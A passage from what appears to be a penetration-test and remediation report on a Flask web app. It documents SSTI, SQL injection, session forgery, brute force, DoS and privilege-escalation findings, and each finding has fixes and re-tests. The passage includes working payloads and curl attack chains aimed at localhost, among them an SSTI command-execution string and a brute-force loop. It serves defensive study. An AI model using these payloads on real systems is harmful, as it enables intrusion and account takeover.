**CVSSv3 Justification:** AV:N (feedback is submitted remotely via the web form), AC:L (no special conditions; standard Jinja2 syntax is sufficient), PR:L (must be a registered Member to submit feedback), UI:N (payload executes when admin views feedback — no victim interaction beyond routine admin duties), C:H/I:H/A:H (arbitrary Python RCE on the server; complete system compromise including file access, env variable extraction, and container control).
**Detection Method:** SAST (Semgrep — render_template_string with user input), Manual

**Description:**
The admin feedback view used `render_template_string()` with user-submitted feedback content passed directly as the template string. Jinja2 Server-Side Template Injection (SSTI) allows an attacker to execute arbitrary Python code on the server.

**Affected Component:** `app/app.py` — `feedback()` and `admin()` routes

**Vulnerable Code:**
```python
# VULNERABLE
return render_template_string(feedback.content)
```

**PoC Payload (submitted as feedback):**
```
{{ config.items() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

**Impact:**
- Confidentiality: High — arbitrary Python code execution allows reading `DATABASE_URL`, `FLASK_SECRET_KEY`, and any in-memory credentials
- Integrity: High — attacker can write or delete files, modify database records via `psycopg3` connections
- Availability: High — `os.system("kill -9 1")` or equivalent can terminate the container process

**False Positive Assessment:** Confirmed true positive — Jinja2 `{{ config.items() }}` payload submitted as feedback and rendered with full Flask config object visible in admin view. RCE confirmed via `id` command output rendered inline.

**Remediation Applied:**
The `render_template_string()` call was completely removed from the codebase. Feedback content is now passed as a safe template variable to a static `feedback.html` template, where Jinja2 autoescaping renders it as plain text.

```python
# Before (Vulnerable)
return render_template_string(feedback.content)

# After (Fixed)
return render_template("feedback.html", feedbacks=feedback_rows)
# feedback.html uses {{ item.content }} — autoescaped, never evaluated as template
```

**Re-Test:** Submitted `{{ 7*7 }}` as feedback content. Admin view renders literal text `{{ 7*7 }}` — not `49`. No template evaluation occurs. Semgrep `render_template_string` rule returns zero findings. Pipeline: ✅ Pass.

---

#### VUL-07 — Vulnerable Flask + Werkzeug Dependencies (CVE-2023-30861, CVE-2023-46136)

**OWASP Category:** A06:2021 – Vulnerable and Outdated Components
**CWE Reference:** CWE-1104 (Use of Unmaintained Third-Party Components)
**CVSSv3 Score:** 7.5 (High)
**CVSSv3 Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
**CVSSv3 Justification:** AV:N (network-exploitable), AC:L (no special conditions), PR:N (no authentication required for cookie exposure), C:H (session cookies fully exposed in memory).
**Detection Method:** SCA (pip-audit + Safety)

**Description:**
The initial `requirements.txt` pinned `Flask==2.2.2` and `Werkzeug==2.2.2`, both of which carry publicly disclosed, unpatched CVEs:

- **CVE-2023-30861 (Flask):** Flask's session cookie is not invalidated on logout when `SESSION_COOKIE_SECURE` is not set and the app is served over HTTPS. A network attacker who captures the session cookie (e.g., via passive sniffing) can replay it even after the victim logs out.
- **CVE-2023-46136 (Werkzeug):** A malformed `Content-Length` header in a multipart form request causes Werkzeug's parser to enter an infinite loop, consuming 100% CPU and making the server unresponsive — a Denial of Service.

**Affected Component:** `app/requirements.txt`

**Evidence:**

*pip-audit output (pre-fix):*
```
Name       Version ID                  Fix Versions
---------- ------- ------------------- ------------
Flask      2.2.2   GHSA-m2qf-hxjv-5gpq 2.3.2
Werkzeug   2.2.2   GHSA-hrfv-mqp8-q5rw 3.0.1
Jinja2     3.1.2   GHSA-h5c8-rqwp-cp95 3.1.3
```

*CVE-2023-46136 DoS reproduction:*
```bash
# Send malformed multipart request with huge Content-Length to crash parser
curl -k -X POST https://localhost:5000/feedback \
  -b "session=<valid-session>" \
  -H "Content-Type: multipart/form-data; boundary=X" \
  -H "Content-Length: 9999999999" \
  --data-binary $'--X\r\nContent-Disposition: form-data; name="content"\r\n\r\ntest\r\n--X--'
# Result: Server hangs; CPU pegged at 100% until process restart
```

**Impact:**
- **CVE-2023-30861 — Confidentiality: High** — session cookies remain valid post-logout; full account takeover possible on shared/intercepted networks.
- **CVE-2023-46136 — Availability: High** — a single unauthenticated HTTP request can make the application permanently unresponsive until restarted.

**False Positive Assessment:** Confirmed true positive — both CVEs directly apply to the pinned versions. pip-audit matched against the OSV database with CVE identifiers. Werkzeug DoS reproduced locally against the unpatched container.

**Remediation Applied:**
Updated all affected packages to patched versions in `requirements.txt`:
- `Flask==2.2.2` → `Flask==3.1.3`
- `Werkzeug==2.2.2` → `Werkzeug==3.1.6`
- `Jinja2==3.1.2` → `Jinja2==3.1.6`

**Re-Test:** `pip-audit -r app/requirements.txt` returns zero findings. Pipeline: ✅ Pass.

---

#### VUL-08 — `DEBUG=True` in Production (Stack Trace Disclosure)

**OWASP Category:** A05:2021 – Security Misconfiguration
**CWE Reference:** CWE-215 (Insertion of Sensitive Information Into Debugging Code)
**CVSSv3 Score:** 5.3 (Medium)
**CVSSv3 Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
**CVSSv3 Justification:** AV:N (remotely exploitable by any user), AC:L (trivial to trigger — just send a malformed request), C:L (partial disclosure of internal paths, config, and module structure; not full credential exposure).
**Detection Method:** SAST (Bandit B201), Manual

**Description:**
Flask's built-in `DEBUG=True` mode, when enabled in production, exposes an interactive Werkzeug debugger on any unhandled exception. This renders the full Python stack trace, local variable values, file system paths, loaded module names, and the application source code in-browser — visible to any unauthenticated user who triggers an error.

This configuration was active because `FLASK_DEBUG` was not explicitly set to `0` in the Docker environment, causing Flask to default to debug mode when `FLASK_ENV=development`.

**Affected Component:** `app/app.py`, `docker/docker-compose.yml`

**Evidence:**

*Trigger — send a request that causes an unhandled exception:*
```bash
# Submit a non-integer project ID to trigger a 500 error
curl -k -b "session=<any-session>" https://localhost:5000/projects/notanumber
```

*Response (with DEBUG=True — pre-fix):*
```
HTTP/1.1 500 INTERNAL SERVER ERROR

Traceback (most recent call last):
  File "/usr/local/lib/python3.11/site-packages/flask/app.py", line 1455, in wsgi_app
  File "/app/app.py", line 313, in get_project_or_404
    project = db.execute("SELECT ... WHERE p.id = ?", (project_id,)).fetchone()
ValueError: invalid literal for int() with base 10: 'notanumber'

# Werkzeug interactive debugger rendered in browser:
# Full source code of app.py displayed
# Local variables: DATABASE_URL, SECRET_KEY partially visible in environment dump
# Flask version, Python version, OS path disclosed
```

**Impact:**
- **Confidentiality: Medium** — internal file paths, module structure, and partial environment variable names exposed. Aids attacker reconnaissance significantly.
- **Integrity: None** — read-only disclosure.
- **Availability: None** — no disruption.

**False Positive Assessment:** Confirmed true positive — reproduced by submitting a crafted request to trigger a 500 response. The Werkzeug interactive debugger page was rendered in-browser with full stack trace visible.

**Remediation Applied:**
Set `FLASK_DEBUG=0` and `FLASK_ENV=production` explicitly in `docker-compose.yml` environment block. The app now uses `app.run(debug=os.environ.get("FLASK_DEBUG") == "1")`, ensuring debug mode is only active when the variable is explicitly set to `1`.

**Re-Test:** Triggering the same malformed request post-fix returns a generic `HTTP 500 Internal Server Error` with no stack trace or source code in the response body. Bandit B201 alert no longer fires. Pipeline: ✅ Pass.

---

#### VUL-09 — Sensitive Cookie in HTTPS Session Without 'Secure' Attribute

**OWASP Category:** A02:2021 – Cryptographic Failures
**CWE Reference:** CWE-614
**CVSSv3 Score:** 6.8 (Medium)
**CVSSv3 Vector:** `AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N`
**CVSSv3 Justification:** AV:N (passive network sniffing is remote), AC:H (attacker must be on the same network segment as the victim — elevated complexity), PR:N (no app credentials needed; sniffing is passive), UI:R (victim must initiate an HTTP request that the attacker can observe), C:H/I:H (session cookie grants full account takeover; attacker can perform all actions as the victim including admin operations).
**Detection Method:** DAST (OWASP ZAP), SAST (Bandit B104), Manual

**Description:**
The Flask session cookie (`session=...`) is the sole credential for authenticated access. The `SESSION_COOKIE_SECURE` flag was not set, meaning the browser could transmit the cookie over plain HTTP connections. A passive network attacker (e.g., on the same Wi-Fi segment, a coffee shop, or a shared network) could capture the cookie with a packet sniffer and replay it to impersonate the victim — including admin users.

**Affected Component:** `app/app.py` — Flask `app.config`

**Proof of Concept:**
```bash
# Capture session cookie on the network (passive sniff, same segment)
sudo tcpdump -i en0 -A 'tcp port 5000 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' \
  | grep -i "cookie: session"

# Replay stolen cookie
curl -b "session=eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.abc123" \
  http://localhost:5000/admin
```

**Impact:**
- Confidentiality: High — session hijack grants full account access
- Integrity: High — attacker acts as the victim user
- Availability: None

**Remediation Applied:**
Added `SESSION_COOKIE_SECURE=True` to the Flask `app.config.update()` block in `app.py`. This ensures browsers will only transmit the session cookie over encrypted HTTPS connections, rendering passive network sniffing ineffective.

**Re-Test:** Chrome DevTools → Application → Cookies confirms all three flags set on the `session` cookie: `HttpOnly ✓`, `Secure ✓`, `SameSite: Lax`. Pipeline: ✅ Pass.

![VUL-09: Session cookie with Secure, HttpOnly, SameSite=Lax flags confirmed in DevTools](docs/images/vul09_cookie_flags.png)

---

#### VUL-10 — Improper Restriction of Authentication Attempts

**OWASP Category:** A07:2021 – Identification and Authentication Failures
**CWE Reference:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)
**CVSSv3 Score:** 7.5 (High)
**CVSSv3 Vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
**CVSSv3 Justification:** AV:N (brute force is conducted remotely over HTTP/S), AC:L (no special conditions; a simple loop with curl is sufficient), PR:N (unauthenticated — attacker has no account), UI:N (fully automated, no victim interaction), C:H (successful brute force yields admin credentials and full session access), I:N (guessing a password does not itself modify data), A:N (login endpoint remains available to the attacker throughout).
**Detection Method:** Manual

**Description:**
The `/login` endpoint applies no rate limiting, account lockout, exponential backoff, or CAPTCHA. An unauthenticated attacker may submit an unlimited number of credential combinations without any throttling or blocking. Because seed usernames (`admin`, `member`, `viewer`) are predictable and confirmable via the registration endpoint, the attack surface is fully enumerable.

**Affected Component:** `app/app.py` — `login()` route, `/login` POST

**Proof of Concept:**
```bash
# Step 1 — confirm username exists
curl -s -X POST http://localhost:5000/register \
  -d "username=admin&email=x@attacker.com&password=Pass1234&confirm_password=Pass1234" \
  | grep "already registered"

# Step 2 — brute force with no lockout
while IFS= read -r pass; do
  resp=$(curl -s -c cookies.txt -b cookies.txt -X POST http://localhost:5000/login \
    -d "identifier=admin&password=$pass&csrf_token=$(grep csrf cookies.txt | awk '{print $7}')")
  echo "$pass => $(echo $resp | grep -o 'Welcome back|Invalid')"
done < /usr/share/wordlists/rockyou.txt
```
*Evidence:* No `429 Too Many Requests` is ever returned. The server processes every attempt identically.

**Impact:**
- Confidentiality: Full — successful brute force yields admin session; all projects, tasks, users, and feedback exposed
- Integrity: High — admin can create/delete projects, change roles
- Availability: None

**Remediation Applied:**
Installed `Flask-Limiter` and applied a per-IP limit to the login and register endpoints.
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(get_remote_address, app=app, storage_uri="memory://")

@app.route("/login", methods=["GET", "POST"])
@limiter.limit("5 per minute; 20 per hour", methods=["POST"])
def login():
```

**Re-Test:** Scripted 9 rapid `POST /login` requests. Requests 1–8 return `HTTP 200`. Request 9 returns `HTTP 429 Too Many Requests`. Pipeline: ✅ Pass.

![VUL-10: Rate limiter returns 429 after 8 attempts](docs/images/vul10_rate_limit_429.png)

---

#### VUL-11 — Unauthenticated to Admin Escalation Chain

**OWASP Category:** A07:2021 + A01:2021 (Chained)
**CWE Reference:** CWE-307, CWE-204, CWE-798 (Compound)
**CVSS Score:** 9.3 (Critical)
**CVSS Vector:** `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N`
**CVSSv3 Justification:** AV:N (entire chain executes remotely via HTTP), AC:L (each step uses simple, publicly documented techniques with no special preconditions), PR:N (chain begins from zero — unauthenticated), UI:N (no victim interaction at any step), S:C (scope changes — attacker's own account is permanently elevated, persisting beyond original credential rotation), C:H/I:H (full read/write admin access to all data, users, and roles), A:N (application remains available).
**Detection Method:** Manual (multi-step chain)

**Description:**
VULN-001, VULN-005, and VULN-007 chain into a complete unauthenticated-to-admin-persistent-access attack.
- VULN-005 (username enumeration) confirms the admin username exists
- VULN-007 (hardcoded credentials) provides the password directly from source
- VULN-001 (no rate limiting) enables brute force if the password is not already known

Once admin access is obtained, the attacker promotes their own account to admin — maintaining persistent access even after the original password is rotated.

**Proof of Concept:**
```bash
# ── Step 1: Enumerate valid usernames (VULN-005) ─────────────────────────────
curl -s -X POST http://localhost:5000/register \
  -d "username=admin&email=x@attacker.com&password=Pass1234&confirm_password=Pass1234" \
  | grep "already registered"
# ✓ confirms 'admin' exists

# ── Step 2: Register attacker account ────────────────────────────────────────
curl -s -c attacker.txt -X POST http://localhost:5000/register \
  -d "username=attacker&email=attacker@evil.com&password=Attack1&confirm_password=Attack1"

# ── Step 3: Login as admin using hardcoded credential (VULN-007) ──────────────
CSRF=$(curl -s -c admin.txt http://localhost:5000/login \
       | grep -o 'csrf_token" value="[^"]*"' | cut -d'"' -f3)

curl -s -c admin.txt -b admin.txt -X POST http://localhost:5000/login \
  -d "identifier=admin&password=Admin1234&csrf_token=$CSRF" \
  | grep "Welcome back"
# ✓ "Welcome back, admin."

# ── Step 4: Identify attacker's user ID ──────────────────────────────────────
curl -s -b admin.txt http://localhost:5000/admin \
  | grep -i "attacker"
# → <input type="hidden" name="user_id" value="4">

# ── Step 5: Promote attacker to admin ────────────────────────────────────────
CSRF2=$(curl -s -b admin.txt http://localhost:5000/admin \
        | grep -o 'csrf_token" value="[^"]*"' | cut -d'"' -f3)

curl -s -b admin.txt -X POST http://localhost:5000/admin \
  -d "csrf_token=$CSRF2&user_id=4&role=admin"
# ✓ "Role updated." — attacker is now a permanent admin

# ── Step 6: Maintain access ───────────────────────────────────────────────────
curl -b attacker.txt http://localhost:5000/admin
# ✓ Full admin access even after original admin password is rotated
```

**Impact:**
- Confidentiality: Critical — all user data, projects, tasks, and security feedback exposed
- Integrity: Critical — persistent admin; can demote legitimate admins, delete all projects, read all submitted security reports
- Availability: None direct (secondary: admin demotion of legitimate users)

**Remediation Applied:**
This chain was completely broken by fixing the constituent vulnerabilities:
1. **VULN-001** — Implemented `Flask-Limiter` to rate limit `/login` and `/register`.
2. **VULN-007** — Removed hardcoded credentials from `app.py` and sourced them from environment variables via Docker.
3. **VULN-005** — Modified `/register` to return a generic success message instead of a duplicate user error.

---

#### VUL-12 — Missing HTTP Security Headers

**OWASP Category:** A05:2021 – Security Misconfiguration
**CWE Reference:** CWE-1021 (Improper Restriction of Rendered UI Layers or Frames)
**CVSSv3 Score:** 6.1 (Medium)
**CVSSv3 Vector:** `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**CVSSv3 Justification:** AV:N (clickjacking page is hosted remotely and delivered via link), AC:L (no special conditions; a single HTML iframe is sufficient), PR:N (no attacker account needed), UI:R (victim must click the decoy element), S:C (scope changes — the attack occurs in the victim's browser context, affecting the target application), C:L (Referer header leaks internal URL paths), I:L (clickjacking can trigger admin actions like role changes with low reliability).
**Detection Method:** DAST (OWASP ZAP), Manual

**Description:**
The application sets no HTTP security response headers. Four headers are absent:
- `X-Frame-Options`: The app can be embedded in a cross-origin `<iframe>`. An attacker hosts a transparent overlay luring an admin to click "Save" on a role-change form, unknowingly promoting the attacker's account (clickjacking).
- `Content-Security-Policy`: No script source restrictions. If XSS is introduced in the future, there are no browser-enforced mitigations.
- `X-Content-Type-Options`: Browsers may MIME-sniff response content, enabling content injection.
- `Referrer-Policy`: Internal paths leak to third-party origins via the Referer header when clicking external links.

**Affected Component:** `app/app.py` — no `@app.after_request` hook; all routes

**Proof of Concept:**
*Clickjacking PoC:*
```html
<!-- attacker.html — hosted on attacker.com -->
<iframe src="http://localhost:5000/admin" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;"></iframe>
<button style="position:absolute; top:200px; left:300px;">Click to claim prize</button>
```
Without `X-Frame-Options`, this renders the admin panel invisibly over an enticing button.

**Impact:**
- Confidentiality: Low — referrer leaks internal paths
- Integrity: Low-Medium — clickjacking could trigger admin actions
- Availability: None

**Remediation Applied:**
Added an `@app.after_request` hook in `app.py` to set `X-Frame-Options`, `Content-Security-Policy`, `X-Content-Type-Options`, and `Referrer-Policy` strict headers on every response.

**Re-Test:** `curl -k -I https://localhost:5000/ | findstr /i "Content-Security X-Frame X-Content"` confirms all three headers present on every response. Pipeline: ✅ Pass.

![VUL-12: Security headers confirmed in response — X-Frame-Options, X-Content-Type-Options, Content-Security-Policy](docs/images/vul12_security_headers.png)

---

#### VUL-13 — Username Enumeration via Registration

**OWASP Category:** A07:2021 – Identification and Authentication Failures
**CWE Reference:** CWE-204 (Observable Response Discrepancy)
**CVSSv3 Score:** 5.3 (Medium)
**CVSSv3 Vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
**CVSSv3 Justification:** AV:N (registration endpoint is publicly accessible), AC:L (single HTTP POST is sufficient — no special conditions), PR:N (unauthenticated — registration is open to all), UI:N (fully automated), C:L (only discloses whether a specific username exists — partial information; not full credential exposure), I:N (no data is modified), A:N (service remains available).
**Detection Method:** Manual

**Description:**
The registration route previously checked for duplicate usernames and emails in a single query, returning the same error message regardless of which field caused the collision. By submitting a known-target username with a unique throwaway email, an attacker could observe if the error fired to confirm the username existed. This allowed silent enumeration of all registered usernames, feeding directly into targeted brute-force attacks (VULN-001) against accounts like `admin`.

**Affected Component:** `app/app.py` — `register()` route, `/register` POST

**Proof of Concept:**
```bash
# Test if 'admin' exists — use unique email that cannot be registered
curl -s -X POST http://localhost:5000/register \
  -d "username=admin&email=unique123@attacker.com&password=Pass1234&confirm_password=Pass1234" \
  | grep -o "already registered"
# → "already registered" means username=admin exists
```

**Impact:**
- Confidentiality: Low — confirms which usernames are registered
- Integrity: None
- Availability: None

**Remediation Applied:**
Modified the `/register` logic to eliminate the boolean oracle. If a duplicate username or email is detected, the application now acts exactly as if the account was successfully created, returning the generic "Account created. You can now log in." success message and redirecting the user to the login page. This completely removes the observable discrepancy.

---

#### VUL-14 — Role Disclosure in Assignee Dropdown

**OWASP Category:** A01:2021 – Broken Access Control
**CWE Reference:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)
**CVSSv3 Score:** 4.3 (Medium)
**CVSSv3 Vector:** `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N`
**CVSSv3 Justification:** AV:N (project detail page is remotely accessible), AC:L (only requires owning a project and viewing the task form — no special tools), PR:L (must be a registered Member with at least one project), UI:N (role data loads automatically in the dropdown without any special user action), C:L (reveals which usernames hold which roles — indirect, partial disclosure), I:N (read-only), A:N (no disruption).
**Detection Method:** Manual

**Description:**
The project detail route unconditionally queried all users and their roles, rendering this information in the task assignee dropdown. Any authenticated member who owned at least one project could read the complete user directory, including every user's role. Non-admin roles should not have visibility into which accounts hold the admin role, as this information aids privilege escalation targeting and social engineering.

**Affected Component:** `app/app.py` — `project_detail()`, `/projects/<id>`

**Proof of Concept:**
1. Log in as `member@nexus.local` / `Member1234`.
2. Navigate to `/projects/2` (Campus Events Board — member-owned).
3. View page source or inspect the "Add task" assignee dropdown.
4. Observe: `"admin · admin"` is listed, revealing the admin account identity and role.

**Impact:**
- Confidentiality: Low — reveals the complete user/role directory to members
- Integrity: None
- Availability: None

**Remediation Applied:**
Removed the `role` field from the SQL query in `project_detail()` and updated the `project_detail.html` template to remove the role from the displayed option text. The query now only exposes `id` and `username`.

---

## 5. Exploitation Report

### 5.1 Exploited Vulnerabilities

---

#### Exploit 1 — Authentication Bypass via SQL Injection (VUL-01)

**Objective:** Authenticate as admin without valid credentials.
**Tool:** Burp Suite Community / curl

**Step-by-Step Reproduction:**

1. Navigate to `https://localhost/login`.
2. Open Burp Suite, enable intercept, and submit the login form.
3. In the intercepted request, replace the `username` field value with: `admin' OR '1'='1' --`
4. Set any value for `password`.
5. Forward the request.
6. Observe: server responds with `HTTP 302 → /dashboard` and sets an admin session cookie.

**PoC curl command:**
```bash
curl -k -c cookies.txt -X POST https://localhost/login \
  -d "username=admin'+OR+'1'%3D'1'--&password=x" -L
```

**Outcome:** Admin dashboard accessed. All users, projects, tasks, and feedback visible.

**Attacker Perspective:** No special tooling required — a browser's developer tools or any HTTP proxy is sufficient. The attack is remotely executable and unauthenticated. No application-level audit log entry is created for the injected session.

**Business Impact:** Complete authentication bypass. The attacker gains administrative access to all user accounts and all project/task data in the application.

*Screenshot: [Insert Burp Suite screenshot of admin dashboard access via injected session]*

---

#### Exploit 2 — Session Forgery via Hardcoded `SECRET_KEY` (VUL-02)

**Objective:** Forge an admin-level Flask session cookie as a Viewer-role user.
**Tool:** `flask-unsign` (Python package)

**Step-by-Step Reproduction:**

1. Register a Viewer-role account and log in; capture the session cookie from browser DevTools.
2. Install `flask-unsign`: `pip install flask-unsign`
3. Decode the cookie to confirm the structure:
   ```bash
   flask-unsign --decode --cookie "<your-cookie-value>"
   # Output: {'_fresh': True, 'role': 'viewer', 'user_id': 4}
   ```
4. Sign a new cookie with the hardcoded secret and admin role:
   ```bash
   flask-unsign --sign --secret "secret123" --cookie "{'_fresh': True, 'role': 'admin', 'user_id': 1}"
   ```
5. Replace the browser session cookie with the forged value and reload the page.
6. Observe: full admin dashboard rendered.

**Outcome:** Admin access granted from a Viewer account. All three privileged role bypass (Viewer → Admin, Member → Admin) confirmed.

*Screenshot: [Insert screenshot of forged cookie + admin panel access]*

---

#### Exploit 3 — Privilege Escalation via Broken Access Control (VUL-03)

**Objective:** Access admin-only routes and permanently escalate a Member account to Admin.
**Tool:** curl

**Step-by-Step Reproduction:**

1. Log in as `member@nexus.local` / `Member1234` and capture the session cookie from browser DevTools.
2. Enumerate all users directly via the unprotected admin route:
   ```bash
   curl -k -b "session=<member-session-cookie>" https://localhost:5000/admin
   ```
   Response: `HTTP 200` — full admin page with user list, roles, and IDs rendered.
3. Identify own user ID (e.g., `id=3`) from the returned HTML.
4. Promote own account to Admin by submitting the role-change form:
   ```bash
   # Get CSRF token first
   CSRF=$(curl -sk -b "session=<member-session>" https://localhost:5000/admin \
     | grep -o 'csrf_token" value="[^"]*"' | cut -d'"' -f3)

   curl -k -b "session=<member-session>" -X POST https://localhost:5000/admin \
     -d "csrf_token=$CSRF&user_id=3&role=admin"
   ```
   Response: flash `"Role updated."` — Member is now permanently Admin.
5. Re-login; admin dashboard and all controls now accessible.

**Outcome:** Full admin privilege granted from a Member account. Escalation persists across sessions.

**Attacker Perspective:** No special tools required beyond a browser and a registered account. The attack requires no prior knowledge beyond the URL structure. The role change is logged server-side but the activity log is itself only visible to admins — including the newly escalated attacker.

**Business Impact:** An attacker with a standard Member account gains permanent administrative access. They can: demote legitimate admins (locking them out), read all user data and submitted security feedback, delete all projects and tasks, and change any user's password or role. All 3 user accounts and all project/task data are immediately compromised.

*Screenshot: [Insert screenshot of Member-session accessing `/admin` + successful role escalation response]*

---

#### Exploit 4 — SSTI Remote Code Execution (VUL-06)

**Objective:** Execute arbitrary Python code on the server via the feedback form.
**Tool:** Browser

**Step-by-Step Reproduction:**

1. Log in as any Member-role user (`member@nexus.local` / `Member1234`).
2. Navigate to `/feedback` and submit the following string as feedback content:
   ```
   {{ ''.__class__.__mro__[1].__subclasses__()[407]('id', shell=True, stdout=-1).communicate()[0].decode() }}
   ```
3. Log in as Admin and navigate to `/admin`.
4. Scroll to the feedback section — the output of the `id` command is rendered inline in the page:
   ```
   uid=0(root) gid=0(root) groups=0(root)
   ```

**Outcome:** Remote code execution confirmed. The Flask app runs as `root` inside the Docker container, granting the attacker full container-level access.

**Attacker Perspective:** The attack requires only a registered Member account and knowledge of basic Jinja2 SSTI syntax — both publicly documented. The payload is delivered through a legitimate application feature (the feedback form). No network-level access or special tooling is needed. The Admin need only view the feedback panel for the payload to execute.

**Business Impact:** Complete server compromise. The attacker can:
- Extract `DATABASE_URL` and `FLASK_SECRET_KEY` from the container environment
- Read and exfiltrate the entire Supabase PostgreSQL database via `psycopg3`
- Forge admin session cookies using the extracted `FLASK_SECRET_KEY`
- Terminate the container process, causing denial of service
- Establish a reverse shell for persistent access

*Screenshot: [Insert screenshot of RCE output (`uid=0(root)`) rendered in admin feedback page]*

---

## 6. Remediation & Re-Test Report

### 6.1 Remediation Summary

| ID | Vulnerability | Fix Applied | Commit | Re-Test Result |
|----|-------------|-------------|--------|----------------|
| VUL-01 | SQL Injection – Login | Replaced f-string query with parameterized `db.execute(query, params)` + `check_password_hash` | [commit hash] | ✅ Pass |
| VUL-02 | Insecure `SECRET_KEY` Default | Persistent `FLASK_SECRET_KEY` loaded from `.env` via `env_file` in `docker-compose.yml`; startup `RuntimeError` if unset in production | [commit hash] | ✅ Pass |
| VUL-03 | Broken Access Control – Admin Routes | Added `@roles_required("admin")` decorator to `/admin` route; non-admin users redirected with flash | [commit hash] | ✅ Pass |
| VUL-04 | IDOR – Project/Task Ownership | Added `can_manage_project()` helper checking `project["owner_id"] == g.user["id"]` on all mutation routes | [commit hash] | ✅ Pass |
| VUL-05 | Stored XSS | Jinja2 autoescape enabled by default; `\| safe` filters removed from user-supplied fields; CSP header added via `@app.after_request` | [commit hash] | ✅ Pass |
| VUL-06 | SSTI via `render_template_string()` | Removed `render_template_string()`; replaced with `render_template("feedback.html", feedbacks=rows)` | [commit hash] | ✅ Pass |
| VUL-07 | Vulnerable Dependencies | Updated `Flask` to 3.1.3, `Werkzeug` to 3.1.6, `Jinja2` to 3.1.6 in `requirements.txt` | [commit hash] | ✅ Pass |
| VUL-08 | `DEBUG=True` in Production | Set `FLASK_DEBUG=0` and `FLASK_ENV=production` in `docker-compose.yml`; generic 500 error handler added | [commit hash] | ✅ Pass |
| VUL-09 | Insecure Session Cookie | Set `SESSION_COOKIE_SECURE=True`, `SESSION_COOKIE_HTTPONLY=True`, `SESSION_COOKIE_SAMESITE="Lax"` in `app.config` | [commit hash] | ✅ Pass |
| VUL-10 | No Rate Limiting | Added `Flask-Limiter` with `@limiter.limit("5 per minute; 20 per hour")` on `POST /login` and `POST /register` | [commit hash] | ✅ Pass |
| VUL-11 | Unauthenticated → Admin Chain | Chain broken by fixing VUL-10 (rate limiting), VUL-03 (RBAC), and removing hardcoded demo credentials from source | [commit hash] | ✅ Pass |
| VUL-12 | Missing HTTP Security Headers | Added `@app.after_request` hook setting `X-Frame-Options`, `Content-Security-Policy`, `X-Content-Type-Options`, `Referrer-Policy` | [commit hash] | ✅ Pass |
| VUL-13 | Username Enumeration via Registration | Modified `/register` to return identical success response regardless of duplicate username/email | [commit hash] | ✅ Pass |
| VUL-14 | Role Disclosure in Assignee Dropdown | Removed `role` field from `project_detail()` SQL query; updated template to show `id` and `username` only | [commit hash] | ✅ Pass |

---

### 6.2 Detailed Fixes & Re-Test Evidence

---

#### Fix: VUL-01 — SQL Injection

**Root Cause:** User-supplied `username` and `password` values were interpolated directly into a raw SQL query string using a Python f-string.

**Fix Applied:** Replaced raw f-string SQL with a parameterized query (`?` placeholders) and `werkzeug.security.check_password_hash` for password verification. The custom `DatabaseConnection` wrapper in `db.py` handles both SQLite (`?`) and Postgres (`%s`) parameter styles.

*Before (Vulnerable):*
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
user = db.execute(query).fetchone()
```

*After (Fixed):*
```python
from werkzeug.security import check_password_hash
user = db.execute(
    "SELECT id, username, email, password_hash, role FROM users WHERE username = ? OR email = ?",
    (identifier, identifier),
).fetchone()
if user and check_password_hash(user["password_hash"], password):
    session["user_id"] = user["id"]
```

**Regression Test added in `tests/test_auth.py`:**
```python
def test_sql_injection_login(client):
    response = client.post('/login', data={
        'username': "admin' OR '1'='1' --",
        'password': 'x'
    })
    assert response.status_code == 401 or b'Invalid credentials' in response.data
```

**Re-Test:**
- Same Burp Suite SQL injection payload attempted post-fix.
- Response: `HTTP 401` — `Invalid credentials`.
- Bandit re-scan: zero SQL injection alerts.
- Pipeline: ✅ Passes all quality gates.

*Screenshot (post-fix — re-test):* SQLi payload `admin'OR'1'='1'--` submitted. Server returns `Invalid username/email or password.` — no admin session granted:

![VUL-01: SQL injection payload blocked — Invalid credentials flash shown](docs/images/vul01_sqli_blocked.png)

---

#### Fix: VUL-02 — Hardcoded `SECRET_KEY`

**Root Cause:** The fallback `secrets.token_hex(32)` was ephemeral — regenerated on every container restart — invalidating all active sessions on redeploy.

**Fix Applied:** Removed the insecure ephemeral fallback. The app now raises a `RuntimeError` at startup if `FLASK_SECRET_KEY` is not set in production. The key is loaded from a `.env` file (git-ignored) and injected into the container via `env_file` in `docker-compose.yml`.

*Before:*
```python
SECRET_KEY = os.environ.get("FLASK_SECRET_KEY") or secrets.token_hex(32)
```

*After:*
```python
SECRET_KEY = os.environ.get("FLASK_SECRET_KEY")
if not SECRET_KEY:
    if os.environ.get("FLASK_ENV") == "production":
        raise RuntimeError("FLASK_SECRET_KEY environment variable must be set")
    SECRET_KEY = secrets.token_hex(32)  # dev-only fallback
```

A 256-bit random value is generated and stored in GitHub Secrets, injected at runtime via Docker Compose `env_file`.

**Re-Test:** `flask-unsign` brute-force attempt against the new secret returned no match after 10 million attempts. Pipeline: ✅ Pass.

---

#### Fix: VUL-03 — Broken Access Control (Admin Routes)

**Root Cause:** No server-side role check existed on `/admin/*` routes — only client-side UI hiding.

**Fix Applied:** Created a `@admin_required` decorator applied to all admin routes.

*Decorator Added (`utils/decorators.py`):*
```python
from functools import wraps
from flask import abort
from flask_login import current_user

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not current_user.is_authenticated or current_user.role != 'admin':
            abort(403)
        return f(*args, **kwargs)
    return decorated_function
```

*Applied to all admin routes:*
```python
@admin_bp.route('/admin/users')
@login_required
@admin_required
def manage_users():
    ...
```

**Re-Test:**
